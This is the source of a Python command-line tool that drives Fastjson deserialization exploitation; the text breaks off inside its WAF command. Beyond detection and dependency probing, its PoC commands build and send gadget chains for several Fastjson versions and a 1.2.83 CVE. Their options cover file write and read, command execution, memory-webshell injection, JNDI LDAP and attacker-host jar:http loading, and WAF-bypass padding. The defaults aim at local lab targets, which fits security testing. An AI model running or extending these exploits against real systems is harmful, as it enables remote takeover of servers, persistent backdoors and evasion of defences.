"""CLI for FastjsonExpToolkit."""

from __future__ import annotations

import json
from typing import Optional

import typer
from rich import print as rprint
from rich.panel import Panel
from rich.table import Table

from fastjson_toolkit.config import load_dotenv
from fastjson_toolkit.detect import FastjsonDetector
from fastjson_toolkit.dnslog import CeyeClient, CeyeConfig

app = typer.Typer(
    name="fjtoolkit",
    help="FastjsonExpToolkit — Fastjson 识别 / PoC 工具",
    add_completion=False,
    no_args_is_help=True,
)


def _parse_headers(header: Optional[list[str]]) -> dict[str, str]:
    headers: dict[str, str] = {}
    for item in header or []:
        if ":" not in item:
            raise typer.BadParameter(f"非法 header: {item}")
        k, v = item.split(":", 1)
        headers[k.strip()] = v.strip()
    return headers


def _waf_cli_options(
    waf: Optional[list[str]],
    pad_size: int,
    comma_count: int,
):
    from fastjson_toolkit.waf import WafOptions

    techs = [t.strip() for t in (waf or []) if t and t.strip()]
    opts = None
    if techs:
        opts = WafOptions(pad_size=pad_size, comma_count=comma_count)
    return techs, opts


@app.command("detect")
def detect_cmd(
    target: str = typer.Argument(..., help="目标 URL，例如 http://127.0.0.1:18080/api/fastjson"),
    dnslog: Optional[str] = typer.Option(None, "--dnslog", help="自定义 DNSLog 域名（不含 CEYE 轮询）"),
    ceye_token: Optional[str] = typer.Option(
        None, "--ceye-token", help="CEYE API token；默认读 CEYE_TOKEN / .env"
    ),
    ceye_domain: Optional[str] = typer.Option(
        None, "--ceye-domain", help="CEYE 子域，默认 hpdth2.ceye.io"
    ),
    ceye_wait: float = typer.Option(8.0, "--ceye-wait", help="CEYE DNS 轮询等待秒数"),
    no_ceye: bool = typer.Option(False, "--no-ceye", help="禁用 CEYE DNSLog"),
    timeout: float = typer.Option(10.0, "--timeout", help="请求超时秒数"),
    no_dns: bool = typer.Option(False, "--no-dns", help="跳过 DNS/时延探针"),
    timing_threshold: float = typer.Option(800.0, "--timing-threshold", help="DNS 时延判定阈值(ms)"),
    header: Optional[list[str]] = typer.Option(
        None,
        "--header",
        "-H",
        help="额外请求头，格式 Key:Value，可重复",
    ),
    proxy: Optional[str] = typer.Option(None, "--proxy", help="HTTP 代理"),
    insecure: bool = typer.Option(False, "--insecure", help="跳过 TLS 校验"),
    json_out: bool = typer.Option(False, "--json", help="输出完整 JSON（便于 Agent 消费）"),
) -> None:
    """对目标做 Fastjson 指纹识别。"""
    load_dotenv()
    headers = _parse_headers(header)

    ceye_cfg = None
    if not no_ceye and not no_dns:
        env_cfg = CeyeConfig.from_env()
        token = ceye_token or (env_cfg.token if env_cfg else None)
        domain = ceye_domain or (env_cfg.domain if env_cfg else "hpdth2.ceye.io")
        if token:
            ceye_cfg = CeyeConfig(token=token, domain=domain)

    detector = FastjsonDetector(
        timeout=timeout,
        headers=headers or None,
        proxy=proxy,
        verify_tls=not insecure,
        dnslog_host=dnslog,
        ceye=ceye_cfg,
        ceye_wait=ceye_wait,
        timing_threshold_ms=timing_threshold,
    )
    try:
        result = detector.detect(target, include_dns=not no_dns)
    finally:
        detector.close()

    if json_out:
        typer.echo(result.model_dump_json(indent=2))
        raise typer.Exit(0 if result.is_fastjson else 1)

    color = "green" if result.is_fastjson else "yellow"
    rprint(Panel(result.summary, title="Fastjson 识别结果", border_style=color))

    table = Table(title="库得分")
    table.add_column("Library")
    table.add_column("Score", justify="right")
    for name, score in sorted(result.scores.items(), key=lambda x: x[1], reverse=True):
        table.add_row(name, f"{score:.2f}")
    rprint(table)

    if result.dns_filter is not None:
        rprint(
            f"CEYE filter=[bold]{result.dns_filter}[/bold] confirmed={result.dns_confirmed} "
            f"records={len(result.dns_records)}"
        )

    ev_table = Table(title="关键证据（节选）")
    ev_table.add_column("Probe")
    ev_table.add_column("Hint")
    ev_table.add_column("Status")
    ev_table.add_column("Matched")
    for ev in result.evidence:
        if not ev.matched and ev.score_delta <= 0:
            continue
        ev_table.add_row(
            ev.probe_id,
            ev.library_hint or "-",
            str(ev.status_code),
            ", ".join(ev.matched[:3]) or "-",
        )
    rprint(ev_table)

    if result.next_actions:
        rprint("[bold]下一步建议[/bold]")
        for i, action in enumerate(result.next_actions, 1):
            rprint(f"  {i}. {action}")

    raise typer.Exit(0 if result.is_fastjson else 1)


@app.command("ceye-check")
def ceye_check_cmd(
    filter_text: Optional[str] = typer.Option(None, "--filter", help="CEYE filter（<=20）"),
    trigger: bool = typer.Option(False, "--trigger", help="本机触发一次 DNS 解析用于连通性验证"),
    wait: float = typer.Option(5.0, "--wait", help="触发后等待秒数"),
    token: Optional[str] = typer.Option(None, "--token", help="CEYE token"),
    domain: Optional[str] = typer.Option(None, "--domain", help="CEYE domain"),
) -> None:
    """查询 / 验证 CEYE DNSLog。"""
    import socket
    import time

    load_dotenv()
    cfg = None
    if token:
        cfg = CeyeConfig(token=token, domain=domain or "hpdth2.ceye.io")
    else:
        cfg = CeyeConfig.from_env()
        if cfg and domain:
            cfg = CeyeConfig(token=cfg.token, domain=domain)
    if cfg is None:
        raise typer.BadParameter("未配置 CEYE_TOKEN（可用 --token 或 .env）")

    filt = filter_text or CeyeClient.new_filter("ck")
    with CeyeClient(cfg) as client:
        host = client.build_host(filt)
        if trigger:
            try:
                socket.getaddrinfo(host, None)
            except socket.gaierror:
                pass
            time.sleep(wait)
        rows = client.query("dns", filt)
        typer.echo(
            json.dumps(
                {
                    "domain": cfg.domain,
                    "filter": filt,
                    "host": host,
                    "count": len(rows),
                    "records": [
                        {"name": r.name, "remote_addr": r.remote_addr, "created_at": r.created_at}
                        for r in rows
                    ],
                },
                ensure_ascii=False,
                indent=2,
            )
        )


@app.command("probes")
def probes_cmd(
    dnslog: Optional[str] = typer.Option(None, "--dnslog", help="DNSLog 域名"),
) -> None:
    """列出内置识别探针（Agent 可用来规划探测顺序）。"""
    from fastjson_toolkit.detect.probes import all_probes

    data = [
        {
            "id": p.id,
            "category": p.category,
            "description": p.description,
            "prefer_typed": p.prefer_typed,
            "dns_related": p.dns_related,
            "payload": p.payload,
            "weight": p.weight,
        }
        for p in all_probes(dnslog)
    ]
    typer.echo(json.dumps(data, ensure_ascii=False, indent=2))


@app.command("deps")
def deps_cmd(
    target: str = typer.Argument(..., help="目标 URL"),
    method: str = typer.Option(
        "character",
        "--method",
        help="character（自动降级 Class）/ class / dns（Locale+Inet4）",
    ),
    category: Optional[list[str]] = typer.Option(
        None, "--category", "-c", help="按类别过滤，可重复"
    ),
    clazz: Optional[list[str]] = typer.Option(
        None, "--class", help="仅扫描指定全限定类名，可重复"
    ),
    dnslog: Optional[str] = typer.Option(None, "--dnslog", help="自定义 DNSLog 域名"),
    ceye_token: Optional[str] = typer.Option(None, "--ceye-token"),
    ceye_domain: Optional[str] = typer.Option(None, "--ceye-domain"),
    ceye_wait: float = typer.Option(10.0, "--ceye-wait"),
    no_ceye: bool = typer.Option(False, "--no-ceye"),
    timeout: float = typer.Option(10.0, "--timeout"),
    concurrency: int = typer.Option(6, "--concurrency"),
    header: Optional[list[str]] = typer.Option(None, "--header", "-H"),
    proxy: Optional[str] = typer.Option(None, "--proxy"),
    insecure: bool = typer.Option(False, "--insecure"),
    json_out: bool = typer.Option(False, "--json"),
) -> None:
    """依赖 / classpath 探测（Character 报错或 DNS Locale）。"""
    from fastjson_toolkit.deps import FastjsonDepsDetector

    load_dotenv()
    headers = _parse_headers(header)
    method_norm = method.strip().lower()
    if method_norm not in ("character", "class", "dns"):
        raise typer.BadParameter("method 仅支持 character、class 或 dns")

    ceye_cfg = None
    if method_norm == "dns" and not no_ceye:
        env_cfg = CeyeConfig.from_env()
        token = ceye_token or (env_cfg.token if env_cfg else None)
        domain = ceye_domain or (env_cfg.domain if env_cfg else "hpdth2.ceye.io")
        if token:
            ceye_cfg = CeyeConfig(token=token, domain=domain)

    detector = FastjsonDepsDetector(
        timeout=timeout,
        headers=headers or None,
        proxy=proxy,
        verify_tls=not insecure,
        dnslog_host=dnslog,
        ceye=ceye_cfg,
        ceye_wait=ceye_wait,
        concurrency=concurrency,
    )
    try:
        result = detector.scan(
            target,
            method=method_norm,
            classes=clazz or None,
            categories=category or None,
        )
    finally:
        detector.close()

    if json_out:
        typer.echo(result.model_dump_json(indent=2))
        raise typer.Exit(0 if result.present_count else 1)

    color = "green" if result.present_count else "yellow"
    rprint(Panel(result.summary, title="依赖探测结果", border_style=color))
    for note in result.notes:
        rprint(f"[dim]{note}[/dim]")

    table = Table(title="命中依赖")
    table.add_column("Description")
    table.add_column("Class")
    table.add_column("Category")
    for hit in result.present:
        table.add_row(hit.description, hit.clazz, hit.category)
    if result.present:
        rprint(table)
    else:
        rprint("[yellow]未发现命中依赖[/yellow]")

    if result.next_actions:
        rprint("[bold]下一步建议[/bold]")
        for i, action in enumerate(result.next_actions, 1):
            rprint(f"  {i}. {action}")

    raise typer.Exit(0 if result.present_count else 1)


@app.command("expect")
def expect_cmd(
    target: str = typer.Argument(..., help="目标 URL（反序列化点）"),
    base_body: Optional[str] = typer.Option(
        None,
        "--base-body",
        help='原始请求 JSON；默认 {"age":20,"name":"Bob"}',
    ),
    timeout: float = typer.Option(10.0, "--timeout"),
    header: Optional[list[str]] = typer.Option(None, "--header", "-H"),
    proxy: Optional[str] = typer.Option(None, "--proxy"),
    insecure: bool = typer.Option(False, "--insecure"),
    json_out: bool = typer.Option(False, "--json"),
) -> None:
    """探测反序列化点是否存在期望类（expectClass）。"""
    from fastjson_toolkit.expect import FastjsonExpectClassDetector

    load_dotenv()
    headers = _parse_headers(header)
    detector = FastjsonExpectClassDetector(
        timeout=timeout,
        headers=headers or None,
        proxy=proxy,
        verify_tls=not insecure,
    )
    try:
        result = detector.detect(target, base_body=base_body)
    finally:
        detector.close()

    if json_out:
        typer.echo(result.model_dump_json(indent=2))
        raise typer.Exit(0 if result.has_expect_class is not None else 1)

    color = "green" if result.has_expect_class else ("yellow" if result.has_expect_class is False else "red")
    rprint(Panel(result.summary, title="期望类探测结果", border_style=color))
    for note in result.notes:
        rprint(f"[dim]{note}[/dim]")

    table = Table(title="探针证据")
    table.add_column("Probe")
    table.add_column("Errored")
    table.add_column("Status")
    table.add_column("Interpretation")
    for ev in result.evidence:
        table.add_row(
            ev.probe_id,
            "-" if ev.errored is None else ("yes" if ev.errored else "no"),
            str(ev.status_code),
            ev.interpretation or "-",
        )
    rprint(table)

    if result.next_actions:
        rprint("[bold]下一步建议[/bold]")
        for i, action in enumerate(result.next_actions, 1):
            rprint(f"  {i}. {action}")

    raise typer.Exit(0 if result.has_expect_class is True else 1)


@app.command("poc-1280")
def poc_1280_cmd(
    gadget: str = typer.Option(
        "jackson_cache",
        "--gadget",
        "-g",
        help="见 --list；如 jackson_cache / io_write / groovy / postgresql",
    ),
    file: Optional[str] = typer.Option(None, "--file", "-f", help="写入/读取路径"),
    content: Optional[str] = typer.Option(None, "--content", "-c", help="写入内容"),
    url: Optional[str] = typer.Option(None, "--read-url", help="io_read_error URL"),
    guess_byte: Optional[int] = typer.Option(None, "--guess-byte", help="报错读首字节"),
    host: Optional[str] = typer.Option(None, "--host", help="MySQL/PG host"),
    port: Optional[int] = typer.Option(None, "--port", help="MySQL/PG port"),
    outbound: bool = typer.Option(
        True, "--outbound/--no-outbound", help="mysql_jdbc：出网 / NamedPipe 不出网"
    ),
    named_pipe_path: Optional[str] = typer.Option(
        "/tmp/mysql.pcap", "--named-pipe-path", help="mysql_jdbc 不出网 pipe 路径"
    ),
    socket_factory_arg: Optional[str] = typer.Option(
        None, "--socket-factory-arg", help="postgresql/jython ClassPathXml URL"
    ),
    classpath: Optional[str] = typer.Option(
        None, "--classpath", help="groovy classpathList jar URL"
    ),
    wrap_currency: bool = typer.Option(
        False,
        "--wrap-currency",
        help="对每步套 Currency 触发 getter（业务点有期望类时）",
    ),
    currency_field: str = typer.Option(
        "currency",
        "--currency-field",
        help="Currency MiscCodec 字段：currency 或 currencyCode",
    ),
    preset: str = typer.Option(
        "file",
        "--preset",
        help="postgresql/jython/groovy：file / custom / exec / echo / memshell",
    ),
    echo: bool = typer.Option(
        False, "--echo", "-e", help="兼容：等价于 --preset echo"
    ),
    engine: str = typer.Option("auto", "--engine", help="回显引擎（preset=echo）"),
    cmd: str = typer.Option("id", "--cmd", help="回显 / preset=exec 命令"),
    cmd_header: str = typer.Option("X-Cmd", "--cmd-header", help="命令请求头"),
    memshell: bool = typer.Option(
        False, "--memshell", help="兼容：等价于 --preset memshell"
    ),
    ms_api: str = typer.Option(
        "jar", "--ms-api", help="jar 或 http(s)://... MemShellParty"
    ),
    ms_server: str = typer.Option("Undertow", "--ms-server"),
    ms_tool: str = typer.Option("Command", "--ms-tool"),
    ms_type: str = typer.Option("Filter", "--ms-type"),
    ms_path: str = typer.Option("/*", "--ms-path"),
    ms_jdk: str = typer.Option("8", "--ms-jdk"),
    target: str = typer.Option(
        "http://127.0.0.1:18280/api/fastjson",
        "--url",
        "-u",
        help="发送目标（配合 --send）",
    ),
    send: bool = typer.Option(False, "--send", help="按步骤 POST payload 到目标"),
    reset_cache: bool = typer.Option(
        False, "--reset-cache", help="发送前调用靶场 /api/reset"
    ),
    waf: Optional[list[str]] = typer.Option(
        None, "--waf", help="WAF 变换 id，可重复；见 fjtoolkit waf --list"
    ),
    pad_size: int = typer.Option(20000, "--pad-size", help="WAF pad 填充长度"),
    comma_count: int = typer.Option(5, "--comma-count", help="WAF 多逗号数量"),
    list_gadgets: bool = typer.Option(False, "--list", help="列出 gadget"),
    json_out: bool = typer.Option(False, "--json", help="输出完整 JSON"),
) -> None:
    """Fastjson ≤1.2.80 Exception 缓存：生成 / 可选按步发送证明 payload。"""
    from fastjson_toolkit.poc import (
        Poc1280SendOptions,
        list_poc_1280_gadgets,
        run_poc_1280,
    )

    if list_gadgets:
        gadgets = list_poc_1280_gadgets()
        if json_out:
            typer.echo(json.dumps(gadgets, ensure_ascii=False, indent=2))
        else:
            for g in gadgets:
                rprint(f"[bold]{g['id']}[/bold]  {g['title']}  ({g['steps']} 步)")
                rprint(f"  {g['description']}")
                rprint(f"  requires: {', '.join(g['requires'])} | jdk: {g['jdk']}")
        raise typer.Exit(0)

    waf_techs, waf_opts = _waf_cli_options(waf, pad_size, comma_count)
    opts = Poc1280SendOptions(
        gadget=gadget,
        file=file,
        content=content,
        url=url,
        guess_byte=guess_byte,
        host=host,
        port=port,
        socket_factory_arg=socket_factory_arg,
        classpath=classpath,
        outbound=outbound,
        named_pipe_path=named_pipe_path,
        wrap_currency=wrap_currency,
        currency_field=currency_field,
        preset=preset,  # type: ignore[arg-type]
        echo=echo,
        engine=engine,  # type: ignore[arg-type]
        cmd=cmd,
        cmd_header=cmd_header,
        memshell=memshell,
        ms_api=ms_api,
        ms_server=ms_server,
        ms_tool=ms_tool,
        ms_type=ms_type,
        ms_path=ms_path,
        ms_jdk=ms_jdk,
        waf_techniques=waf_techs,
        waf_options=waf_opts,
        target=target,
        send=send,
        reset_cache=reset_cache,
    )
    try:
        result = run_poc_1280(opts)
    except (KeyError, ValueError) as exc:
        rprint(f"[red]{exc}[/red]")
        raise typer.Exit(2) from exc

    if json_out:
        typer.echo(result.model_dump_json(indent=2))
    else:
        rprint(Panel(result.summary, title=f"1.2.80 / {result.gadget}", border_style="cyan"))
        if result.memshell_connect:
            rprint(Panel(result.memshell_connect, title="memshell 连接信息", border_style="green"))
        if result.steps:
            for i, step in enumerate(result.steps, 1):
                rprint(f"[dim]--- step {i}/{len(result.steps)} ---[/dim]")
                rprint(step[:1500] + ("..." if len(step) > 1500 else ""))
        if result.sent and result.status_codes:
            rprint(f"[dim]HTTP {result.status_codes}[/dim]")
            if result.response_preview:
                rprint(result.response_preview[:500])
    raise typer.Exit(0 if result.ok else 1)


@app.command("poc-1268")
def poc_1268_cmd(
    gadget: str = typer.Option(
        "file_truncate",
        "--gadget",
        "-g",
        help="见 --list；如 file_truncate / jdk11_write / io_final",
    ),
    file: Optional[str] = typer.Option(None, "--file", "-f", help="写入/截断路径"),
    content: Optional[str] = typer.Option(None, "--content", "-c", help="写入内容"),
    source: Optional[str] = typer.Option(None, "--source", help="file_copy 源路径"),
    url: Optional[str] = typer.Option(None, "--read-url", help="io_read_* URL"),
    guess_byte: Optional[int] = typer.Option(None, "--guess-byte", help="报错读单字节探测"),
    read_length: Optional[int] = typer.Option(
        None,
        "--read-length",
        help="io_read_error 爆破读最大字节数（配合 --send）",
    ),
    read_charset: str = typer.Option(
        "mixed",
        "--read-charset",
        help="爆破码表：mixed / lower / printable",
    ),
    host: Optional[str] = typer.Option(None, "--host", help="MySQL/PG host"),
    port: Optional[int] = typer.Option(None, "--port", help="MySQL/PG port"),
    jdbc_url: Optional[str] = typer.Option(
        None, "--jdbc-url", help="mysql_jdbc 6.0 完整 JDBC URL"
    ),
    mysql_version: str = typer.Option(
        "5.1", "--mysql-version", help="mysql_jdbc：5.1 / 6.0 / 8.0"
    ),
    outbound: bool = typer.Option(
        True, "--outbound/--no-outbound", help="mysql_jdbc：出网 / NamedPipe 不出网"
    ),
    named_pipe_path: Optional[str] = typer.Option(
        "/tmp/mysql.pcap", "--named-pipe-path", help="mysql_jdbc 不出网 pipe 路径"
    ),
    socket_factory_arg: Optional[str] = typer.Option(
        None, "--socket-factory-arg", help="postgresql ClassPathXml URL"
    ),
    wrap_currency: bool = typer.Option(
        False,
        "--wrap-currency",
        help="套 Currency 触发 getter（业务点有期望类时）",
    ),
    currency_field: str = typer.Option(
        "currency",
        "--currency-field",
        help="Currency MiscCodec 字段：currency 或 currencyCode",
    ),
    preset: str = typer.Option(
        "file",
        "--preset",
        help="postgresql_ssrf：file / custom / exec / echo / memshell",
    ),
    echo: bool = typer.Option(
        False, "--echo", "-e", help="兼容：等价于 --preset echo"
    ),
    engine: str = typer.Option("auto", "--engine", help="回显引擎（preset=echo）"),
    cmd: str = typer.Option("id", "--cmd", help="回显 / preset=exec 命令"),
    cmd_header: str = typer.Option("X-Cmd", "--cmd-header", help="命令请求头"),
    memshell: bool = typer.Option(
        False, "--memshell", help="兼容：等价于 --preset memshell"
    ),
    ms_api: str = typer.Option(
        "jar", "--ms-api", help="jar 或 http(s)://... MemShellParty"
    ),
    ms_server: str = typer.Option("Undertow", "--ms-server"),
    ms_tool: str = typer.Option("Command", "--ms-tool"),
    ms_type: str = typer.Option("Filter", "--ms-type"),
    ms_path: str = typer.Option("/*", "--ms-path"),
    ms_jdk: str = typer.Option("8", "--ms-jdk"),
    target: str = typer.Option(
        "http://127.0.0.1:18268/api/fastjson",
        "--url",
        "-u",
        help="发送目标（配合 --send）",
    ),
    send: bool = typer.Option(False, "--send", help="POST payload 到目标"),
    waf: Optional[list[str]] = typer.Option(
        None, "--waf", help="WAF 变换 id，可重复；见 fjtoolkit waf --list"
    ),
    pad_size: int = typer.Option(20000, "--pad-size", help="WAF pad 填充长度"),
    comma_count: int = typer.Option(5, "--comma-count", help="WAF 多逗号数量"),
    list_gadgets: bool = typer.Option(False, "--list", help="列出 gadget（默认不含隐藏项）"),
    include_hidden: bool = typer.Option(
        False, "--all", help="列出时包含隐藏的 io1–io5 等变体"
    ),
    json_out: bool = typer.Option(False, "--json", help="输出完整 JSON"),
) -> None:
    """Fastjson ≤1.2.68 AutoCloseable：生成 / 可选发送证明 payload。"""
    from fastjson_toolkit.poc import (
        Poc1268SendOptions,
        list_poc_1268_gadgets,
        run_poc_1268,
    )

    if list_gadgets:
        gadgets = list_poc_1268_gadgets(include_hidden=include_hidden)
        if json_out:
            typer.echo(json.dumps(gadgets, ensure_ascii=False, indent=2))
        else:
            for g in gadgets:
                hidden = " [hidden]" if g.get("hidden") else ""
                rprint(f"[bold]{g['id']}[/bold]{hidden}  {g['title']}")
                rprint(f"  {g['description']}")
                rprint(f"  requires: {', '.join(g['requires'])} | jdk: {g['jdk']}")
        raise typer.Exit(0)

    waf_techs, waf_opts = _waf_cli_options(waf, pad_size, comma_count)
    opts = Poc1268SendOptions(
        gadget=gadget,
        file=file,
        content=content,
        source=source,
        url=url,
        guess_byte=guess_byte,
        read_length=read_length,
        read_charset=read_charset,
        host=host,
        port=port,
        jdbc_url=jdbc_url,
        mysql_version=mysql_version,
        outbound=outbound,
        named_pipe_path=named_pipe_path,
        socket_factory_arg=socket_factory_arg,
        wrap_currency=wrap_currency,
        currency_field=currency_field,
        preset=preset,  # type: ignore[arg-type]
        echo=echo,
        engine=engine,  # type: ignore[arg-type]
        cmd=cmd,
        cmd_header=cmd_header,
        memshell=memshell,
        ms_api=ms_api,
        ms_server=ms_server,
        ms_tool=ms_tool,
        ms_type=ms_type,
        ms_path=ms_path,
        ms_jdk=ms_jdk,
        waf_techniques=waf_techs,
        waf_options=waf_opts,
        target=target,
        send=send,
    )
    try:
        result = run_poc_1268(opts)
    except (KeyError, ValueError) as exc:
        rprint(f"[red]{exc}[/red]")
        raise typer.Exit(2) from exc

    if json_out:
        typer.echo(result.model_dump_json(indent=2))
    else:
        rprint(Panel(result.summary, title=f"1.2.68 / {result.gadget}", border_style="cyan"))
        if result.memshell_connect:
            rprint(Panel(result.memshell_connect, title="memshell 连接信息", border_style="green"))
        if result.read_content is not None:
            rprint(
                Panel(
                    repr(result.read_content),
                    title=f"报错读内容 ({len(result.read_bytes or [])} bytes)",
                    border_style="green",
                )
            )
        rprint(result.payload[:2000] + ("..." if len(result.payload) > 2000 else ""))
        if result.sent and result.status_code is not None:
            rprint(f"[dim]HTTP {result.status_code}[/dim]")
            if result.response_preview:
                rprint(result.response_preview[:500])
    raise typer.Exit(0 if result.ok else 1)


@app.command("poc-1247")
def poc_1247_cmd(
    gadget: str = typer.Option(
        "jdbc_rowset",
        "--gadget",
        "-g",
        help=(
            "jdbc_rowset / bcel_tomcat_dbcp / bcel_tomcat_dbcp2 / "
            "bcel_commons_dbcp / bcel_commons_dbcp2 / c3p0_wrapper / "
            "mybatis_bcel / h2_jdbc"
        ),
    ),
    jndi_url: str = typer.Option(
        "ldap://127.0.0.1:1389/Exploit",
        "--jndi",
        help="JdbcRowSetImpl dataSourceName",
    ),
    bcel_code: Optional[str] = typer.Option(None, "--bcel", help="$$BCEL$$..."),
    class_b64: Optional[str] = typer.Option(None, "--class-b64", help=".class Base64"),
    user_overrides: Optional[str] = typer.Option(
        None, "--user-overrides", help="C3P0 HexAsciiSerializedMap"
    ),
    serialized_b64: Optional[str] = typer.Option(
        None, "--serialized-b64", help="二次反序列化 gadget Base64"
    ),
    h2_url: Optional[str] = typer.Option(None, "--h2-url", help="完整 H2 JDBC URL"),
    getter_trigger: str = typer.Option(
        "ref",
        "--getter-trigger",
        "-t",
        help="ref / json_key / currency / currency_json_key（有期望类用 currency*）",
    ),
    currency_field: str = typer.Option(
        "currency",
        "--currency-field",
        help="Currency MiscCodec 字段：currency 或 currencyCode",
    ),
    json_key_no_type: bool = typer.Option(
        False,
        "--json-key-no-type",
        help="json_key 省略 @type=JSONObject（{} 默认为 JSONObject）",
    ),
    json_key_as_array: bool = typer.Option(
        False,
        "--json-key-array",
        help="json_key 用 JSONArray 作 key：[{...}]:{}",
    ),
    preset: str = typer.Option(
        "auto",
        "--preset",
        help="预设字节码：auto / custom / touch / exec / echo / memshell（off→custom）",
    ),
    proof_path: Optional[str] = typer.Option(
        None, "--proof-path", help="preset=touch/exec/auto 证明文件路径"
    ),
    proof_content: Optional[str] = typer.Option(
        None, "--proof-content", help="preset=touch/exec/auto 写入内容前缀"
    ),
    echo: bool = typer.Option(
        False, "--echo", "-e", help="兼容：等价于 --preset echo"
    ),
    engine: str = typer.Option("auto", "--engine", help="回显引擎（preset=echo）"),
    cmd: str = typer.Option("id", "--cmd", help="回显 / preset=exec 命令"),
    cmd_header: str = typer.Option("X-Cmd", "--cmd-header", help="命令请求头"),
    memshell: bool = typer.Option(
        False, "--memshell", help="兼容：等价于 --preset memshell"
    ),
    ms_api: str = typer.Option(
        "jar", "--ms-api", help="jar 或 http(s)://... MemShellParty"
    ),
    ms_server: str = typer.Option("Undertow", "--ms-server"),
    ms_tool: str = typer.Option("Command", "--ms-tool"),
    ms_type: str = typer.Option("Filter", "--ms-type"),
    ms_path: str = typer.Option("/*", "--ms-path"),
    ms_jdk: str = typer.Option("8", "--ms-jdk"),
    target: str = typer.Option(
        "http://127.0.0.1:18247/api/fastjson",
        "--url",
        "-u",
        help="发送目标（配合 --send）",
    ),
    send: bool = typer.Option(False, "--send", help="POST payload 到目标"),
    waf: Optional[list[str]] = typer.Option(
        None, "--waf", help="WAF 变换 id，可重复；见 fjtoolkit waf --list"
    ),
    pad_size: int = typer.Option(20000, "--pad-size", help="WAF pad 填充长度"),
    comma_count: int = typer.Option(5, "--comma-count", help="WAF 多逗号数量"),
    list_gadgets: bool = typer.Option(False, "--list", help="列出 gadget"),
    json_out: bool = typer.Option(False, "--json", help="输出完整 JSON"),
) -> None:
    """Fastjson ≤1.2.47 缓存绕过：生成 / 可选发送证明 payload。"""
    from fastjson_toolkit.poc import (
        Poc1247SendOptions,
        list_poc_1247_gadgets,
        run_poc_1247,
    )

    if list_gadgets:
        gadgets = list_poc_1247_gadgets()
        if json_out:
            typer.echo(json.dumps(gadgets, ensure_ascii=False, indent=2))
        else:
            for g in gadgets:
                rprint(f"[bold]{g['id']}[/bold]  {g['title']}")
                rprint(f"  {g['description']}")
                rprint(f"  requires: {', '.join(g['requires'])} | jdk: {g['jdk']}")
        raise typer.Exit(0)

    waf_techs, waf_opts = _waf_cli_options(waf, pad_size, comma_count)
    opts = Poc1247SendOptions(
        gadget=gadget,
        jndi_url=jndi_url,
        bcel_code=bcel_code,
        class_b64=class_b64,
        user_overrides=user_overrides,
        serialized_b64=serialized_b64,
        h2_url=h2_url,
        getter_trigger=getter_trigger,
        currency_field=currency_field,
        json_key_with_type=not json_key_no_type,
        json_key_as_array=json_key_as_array,
        preset=preset,  # type: ignore[arg-type]
        proof_path=proof_path,
        proof_content=proof_content,
        echo=echo,
        engine=engine,  # type: ignore[arg-type]
        cmd=cmd,
        cmd_header=cmd_header,
        memshell=memshell,
        ms_api=ms_api,
        ms_server=ms_server,
        ms_tool=ms_tool,
        ms_type=ms_type,
        ms_path=ms_path,
        ms_jdk=ms_jdk,
        waf_techniques=waf_techs,
        waf_options=waf_opts,
        target=target,
        send=send,
    )
    try:
        result = run_poc_1247(opts)
    except (KeyError, ValueError) as exc:
        rprint(f"[red]{exc}[/red]")
        raise typer.Exit(2) from exc

    if json_out:
        typer.echo(result.model_dump_json(indent=2))
    else:
        rprint(Panel(result.summary, title=f"1.2.47 / {result.gadget}", border_style="cyan"))
        if result.memshell_connect:
            rprint(Panel(result.memshell_connect, title="memshell 连接信息", border_style="green"))
        rprint(result.payload)
        if result.sent and result.status_code is not None:
            rprint(f"[dim]HTTP {result.status_code}[/dim]")
            if result.response_preview:
                rprint(result.response_preview[:500])
    raise typer.Exit(0 if result.ok else 1)


@app.command("poc-16723")
def poc_16723_cmd(
    target: str = typer.Option(
        "http://127.0.0.1:18083",
        "--url",
        "-u",
        help="目标基址（默认 Undertow 靶场 18083）",
    ),
    mode: str = typer.Option(
        "http",
        "--mode",
        "-m",
        help="http=jar:http 出网；fd=fd-cache 不出网",
    ),
    host: str = typer.Option(
        "attacker",
        "--host",
        "-H",
        help="攻击者 HTTP 主机（靶场视角）；IPv4 自动转十进制",
    ),
    port: int = typer.Option(9192, "--port", "-P", help="攻击者 HTTP 端口"),
    cmd: str = typer.Option("id", "--cmd", "-c", help="执行/回显验证命令"),
    echo: bool = typer.Option(False, "--echo", "-e", help="回显模式"),
    engine: str = typer.Option("auto", "--engine", help="auto/spring/undertow/tomcat"),
    json_path: str = typer.Option("/json", "--json-path", help="反序列化路径"),
    docker_container: str = typer.Option(
        "cve-2026-16723-undertow",
        "--docker-container",
        help="读证明文件的 docker 容器名；传空禁用",
    ),
    reuse_type: Optional[str] = typer.Option(None, "--type", "-t", help="复用已命中 @type"),
    memshell: bool = typer.Option(
        False, "--memshell", help="注入内存马（默认内置 jar；也可 --ms-api http://...）"
    ),
    ms_api: str = typer.Option(
        "jar", "--ms-api", help="jar=内置 memshell-gen.jar；或 http(s)://..."
    ),
    ms_server: str = typer.Option("Undertow", "--ms-server"),
    ms_tool: str = typer.Option("Command", "--ms-tool"),
    ms_type: str = typer.Option("Filter", "--ms-type"),
    ms_path: str = typer.Option("/*", "--ms-path"),
    ms_jdk: str = typer.Option("8", "--ms-jdk"),
    json_out: bool = typer.Option(False, "--json", help="输出完整 JSON"),
) -> None:
    """CVE-2026-16723（Fastjson 1.2.83）证明 PoC：jar:http / fd-cache。"""
    from fastjson_toolkit.poc import Poc16723Options, run_cve_2026_16723

    mode_norm = mode.strip().lower()
    if mode_norm not in ("http", "fd"):
        raise typer.BadParameter("mode 仅支持 http 或 fd")
    engine_norm = engine.strip().lower()
    if engine_norm not in ("auto", "spring", "undertow", "tomcat"):
        raise typer.BadParameter("engine 仅支持 auto/spring/undertow/tomcat")

    # CLI 默认跟原脚本一致：不带 -e 时走写文件/命令；Web/API 默认 echo=True
    opts = Poc16723Options(
        target=target,
        mode=mode_norm,  # type: ignore[arg-type]
        host=host,
        port=port,
        cmd=cmd,
        echo=echo,
        engine=engine_norm,  # type: ignore[arg-type]
        json_path=json_path,
        docker_container=docker_container,
        reuse_type=reuse_type,
        memshell=memshell,
        ms_api=ms_api,
        ms_server=ms_server,
        ms_tool=ms_tool,
        ms_type=ms_type,
        ms_path=ms_path,
        ms_jdk=ms_jdk,
    )
    result = run_cve_2026_16723(opts)
    if json_out:
        typer.echo(result.model_dump_json(indent=2))
    else:
        color = "green" if result.ok else "red"
        rprint(Panel(result.summary, title="CVE-2026-16723", border_style=color))
        for note in result.notes:
            rprint(f"[dim]{note}[/dim]")
    raise typer.Exit(0 if result.ok else result.exit_code)


@app.command("waf")
def waf_cmd(
    payload: Optional[str] = typer.Argument(
        None,
